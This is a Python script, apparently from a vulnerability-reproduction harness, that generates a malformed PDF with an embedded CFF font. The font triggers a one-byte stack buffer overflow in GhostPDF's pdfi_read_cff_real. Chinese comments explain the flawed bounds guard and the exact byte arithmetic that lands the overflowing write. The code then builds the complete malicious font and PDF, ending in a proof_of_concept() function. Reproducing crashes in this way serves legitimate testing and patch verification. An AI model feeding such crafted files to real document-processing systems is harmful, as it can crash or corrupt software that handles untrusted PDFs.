"""S21（arvo:58405 / GhostPDF CFF）构造器：DICT real 转换越界写。

缺陷（pdf/pdf_font1C.c:689 pdfi_read_cff_real）：
    char buf[65];
    while (txt < buf + (sizeof buf) - 3 && p < e) {      // 守卫只留 3 字节
        ...
        else if (n == 0xC) { *txt++ = 'E'; *txt++ = '-'; }   // 一个 0xC nibble 写 2 字符
    }
    *txt = 0;                                            // 再加 NUL

nibble 0xC 会展开成 "E-"，一个字节 0xCC 就是 "E-E-"（4 字节）+ NUL = 5 字节，
而守卫按 3 字节算，于是 txt 走到 buf+61 时再遇到 0xCC，就会写到 buf+65 ——
末尾那次 *txt = 0 落在 buf[65]（数组外 1 字节），ASAN: stack-buffer-overflow WRITE of size 1。
patch 把守卫从 -3 改成 -5。

触发算数：循环每字节产出 2/3/4 个字符。要让 txt 恰好停在 61：
    19 个 0xC1（每个 'E','-','1' = 3 字符）= 57
  + 2 个 0x11（每个 '1','1' = 2 字符）  = 4  -> 61
  + 1 个 0xCC（'E','-','E','-' = 4 字符）-> 65 -> 越界 NUL
real 以 0x1e（CFF DICT 的 30）开头，作为 Top DICT 的最后一个操作数即可 ——
解析器把整段 DICT 扫完，不需要完整字形数据也能走到这段代码。

PDF 侧：最小 Type0 -> CIDFontType0 -> FontDescriptor /FontFile3(/CIDFontType0C) 链，
页面内容用 BT /F1 12 Tf (A) Tj ET 触发字体加载。
"""
from __future__ import annotations

import struct


def cff_index(items):
    """CFF INDEX（count 为 2 字节）：items 是 bytes 列表。"""
    if not items:
        return b"\x00\x00"
    data = b"".join(items)
    offs = [1]
    for it in items:
        offs.append(offs[-1] + len(it))
    off_size = 1 if offs[-1] < 256 else 2
    out = struct.pack(">H", len(items)) + bytes([off_size])
    for o in offs:
        out += o.to_bytes(off_size, "big")
    return out + data


DEFAULTS = {"n_c1": 19, "n_11": 2, "cc": 1, "subtype": "CIDFontType0C"}

FIELDS = {
    "n_c1": "int, 0xC1 字节个数（每个产出 3 字符；默认 19）",
    "n_11": "int, 0x11 字节个数（每个产出 2 字符；默认 2）",
    "cc": "int, 末尾 0xCC 字节个数（默认 1；每个产出 4 字符）",
    "subtype": "str, FontFile3 的 Subtype（默认 CIDFontType0C）",
}


class CffPdfResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "pdf-cff"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build_cff(n_c1: int = 19, n_11: int = 2, cc: int = 1) -> bytes:
    """拼一个只含恶意 Top DICT 的 CFF（无字形，够走到 pdfi_read_cff_real）。"""
    header = bytes([1, 0, 4, 4])
    real = b"\x1e" + b"\xc1" * n_c1 + b"\x11" * n_11 + b"\xcc" * cc
    top_dict = cff_index([real])
    return header + cff_index([b"A"]) + top_dict + b"\x00\x00" + b"\x00\x00"


def build_pdf(fontdata: bytes, subtype: str = "CIDFontType0C") -> bytes:
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] "
         b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>"),
    ]
    content = b"BT /F1 12 Tf (A) Tj ET"
    objs.append(b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream")
    objs.append(b"<< /Type /Font /Subtype /Type0 /BaseFont /AAAAAA+Vuln "
                b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>")
    objs.append(b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /AAAAAA+Vuln "
                b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> "
                b"/FontDescriptor 7 0 R /DW 1000 >>")
    objs.append(b"<< /Type /FontDescriptor /FontName /AAAAAA+Vuln /Flags 4 "
                b"/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 "
                b"/CapHeight 700 /StemV 80 /FontFile3 8 0 R >>")
    objs.append(b"<< /Length %d /Subtype /" % len(fontdata) + subtype.encode() + b" >>\nstream\n"
                + fontdata + b"\nendstream")
    out = b"%PDF-1.4\n"
    offs = []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += b"%d 0 obj\n" % i + o + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for off in offs:
        out += b"%010d 00000 n \n" % off
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))
    return out


def build(fields: dict) -> CffPdfResult:
    fields = dict(fields or {})
    used, dropped = {}, []
    params = dict(DEFAULTS)
    for key in ("n_c1", "n_11", "cc"):
        if key in fields:
            try:
                params[key] = int(fields[key])
            except (TypeError, ValueError):
                return CffPdfResult(False, reason="%s 必须是整数" % key)
    if params["n_c1"] < 0 or params["n_11"] < 0 or params["cc"] < 0:
        return CffPdfResult(False, reason="n_c1/n_11/cc 不能为负")
    if params["n_c1"] == 0 and params["cc"] == 0:
        return CffPdfResult(False, reason="没有 0xC nibble，产不出越界")
    if "subtype" in fields:
        params["subtype"] = str(fields["subtype"])
    used.update(params)
    for k in fields:
        if k not in FIELDS:
            dropped.append({"field": k, "reason": "cff_pdf 构造器不识别该字段"})
    font = build_cff(params["n_c1"], params["n_11"], params["cc"])
    data = build_pdf(font, params["subtype"])
    if not data.startswith(b"%PDF-1.4"):
        return CffPdfResult(False, reason="PDF 头缺失")
    return CffPdfResult(True, data, used, dropped)


def proof_of_concept() -> bytes:
    res = build({})
    if not res.ok:
        raise RuntimeError("cff_pdf builder failed: " + res.reason)
    return res.data
